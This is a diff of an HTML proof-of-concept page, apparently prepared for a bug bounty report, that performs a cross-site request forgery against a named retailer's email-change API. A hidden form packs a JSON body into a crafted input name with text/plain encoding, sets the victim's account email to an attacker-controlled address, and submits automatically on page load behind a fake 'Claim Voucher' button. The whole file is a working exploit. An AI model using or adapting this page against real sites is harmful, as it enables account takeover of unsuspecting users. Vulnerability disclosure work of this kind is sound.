@@ -11,12 +11,12 @@
 
     <form id="exploit-form" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST"
         enctype="text/plain">
-        <input type="hidden" name='{"email:","email":"absolutexon+pwned@wearehackerone.com"' value='"}'>
+        <input type="hidden" name='{"email":"attacker+extratest2@wearehackerone.com"}' value=''>
         <input type="submit" value="Claim Voucher">
     </form>
 
     <script>
-        // Auto-submit the form as soon as the victim visits
+        // Auto-submit the form
         document.getElementById('exploit-form').submit();
     </script>
 </body>
